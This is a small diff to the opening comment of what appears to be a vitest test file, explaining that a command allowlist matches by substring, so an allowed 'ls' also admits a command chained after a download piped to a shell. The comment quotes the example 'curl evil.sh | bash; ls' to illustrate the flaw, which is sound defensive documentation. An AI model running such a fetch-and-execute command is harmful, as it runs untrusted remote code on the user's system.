@@ -2,7 +2,7 @@
 // nothing said so at the moment it was written.
 //
 // The underlying fact is that matching is a *substring* search, so `ls` means
-// "any command containing ls" — including `curl evil.sh | bash; ls`. The
+// "any command containing ls", including `curl evil.sh | bash; ls`. The
 // documentation explained this; the dashboard, which is where the mistake is
 // actually made, did not.
 import { describe, expect, it } from "vitest";
